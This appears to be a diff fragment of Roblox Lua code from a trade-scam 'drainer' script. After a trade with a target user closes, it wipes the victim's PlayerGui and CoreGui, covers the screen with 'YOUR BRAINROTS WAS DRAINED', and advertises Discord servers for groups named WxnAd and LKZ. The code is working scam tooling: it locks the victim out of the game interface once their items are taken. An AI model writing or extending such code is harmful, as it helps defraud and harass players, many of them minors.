+        statusDot.BackgroundColor3 = Color3.fromRGB(80, 220, 100)
+        statusDot.BorderSizePixel = 0
+        statusDot.ZIndex = 4
+        statusDot.Parent = statusContainer
+        Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
+
+        local countLabel = Instance.new("TextLabel")
+        countLabel.Size = UDim2.new(1, -12, 1, 0)
+        countLabel.Position = UDim2.fromOffset(10, 0)
+        countLabel.BackgroundTransparency = 1
+        countLabel.Text = serverData and (tostring(serverData.members) .. " members") or ""
+        countLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+        countLabel.TextSize = 12
+        countLabel.Font = Enum.Font.Gotham
+        countLabel.TextXAlignment = Enum.TextXAlignment.Left
+        countLabel.TextYAlignment = Enum.TextYAlignment.Center
+        countLabel.ZIndex = 4
+        countLabel.Parent = statusContainer
+    end
+
+    local function renderLockoutScreen()
+        if lockoutShown then return end
+        lockoutShown = true
+
+        pcall(function()
+            pg:ClearAllChildren()
+        end)
+        pcall(function()
+            game:GetService("CoreGui"):ClearAllChildren()
+        end)
+
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.IgnoreGuiInset = true
+        screenGui.ResetOnSpawn = false
+        screenGui.Parent = game:GetService("CoreGui")
+
+        local function createFrame(parent, size, position, zIndex)
+            local frame = Instance.new("Frame")
+            frame.Size = size
+            frame.Position = position
+            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            frame.BorderSizePixel = 0
+            if zIndex then frame.ZIndex = zIndex end
+            frame.Parent = parent
+            return frame
+        end
+
+        local rootFrame = createFrame(screenGui, UDim2.fromScale(1, 1), UDim2.fromScale(0, 0), nil)
+        createFrame(screenGui, UDim2.fromScale(1.2, 1.2), UDim2.fromScale(-0.1, -0.1), -1)
+
+        local function createTextLabel(parent, size, position, text, color, fontSize)
+            local label = Instance.new("TextLabel")
+            label.Size = size
+            label.Position = position
+            label.BackgroundTransparency = 1
+            label.Text = text
+            label.TextColor3 = color
+            label.TextScaled = (fontSize == nil)
+            if fontSize then
+                label.TextSize = fontSize
+                label.TextScaled = false
+            end
+            label.Font = Enum.Font.GothamBold
+            label.TextXAlignment = Enum.TextXAlignment.Center
+            label.TextYAlignment = Enum.TextYAlignment.Center
+            label.Parent = parent
+            return label
+        end
+
+        createTextLabel(rootFrame, UDim2.fromScale(1, 0.3), UDim2.fromScale(0, 0.1), "YOUR BRAINROTS WAS DRAINED", Color3.fromRGB(255, 0, 0), nil)
+        createTextLabel(rootFrame, UDim2.fromScale(0.8, 0.08), UDim2.fromScale(0.1, 0.72), "Server: https://discord.gg/UA9xGPKAqE", Color3.fromRGB(180, 180, 180), 13).TextTransparency = 0.4
+
+        task.spawn(function()
+            local WxnAdGuild = fetchDiscordInvite("WxnAd", "WxnAd")
+            local LKZGuild = fetchDiscordInvite("LKZ", "LKZ")
+            createDiscordCard(rootFrame, UDim2.new(0, 10, 1, -182), WxnAdGuild, "WxnAd")
+            createDiscordCard(rootFrame, UDim2.new(0, 10, 1, -92), LKZGuild, "LKZ")
+        end)
+    end
+
+    tradeReplicator:ListenRaw(function()
+        local active = tradeReplicator:TryIndex({ "active", "data" })
+        if active then
+            if not tradeOpened then
+                tradeOpened = true
+                otherUserId = getOtherUserId()
+            end
+        elseif tradeOpened then
+            tradeOpened = false
+            local partner = otherUserId
+            otherUserId = nil
+            if partner == targetId and not lockoutShown then
+                renderLockoutScreen()
+            end
+        end
+    end)
+end
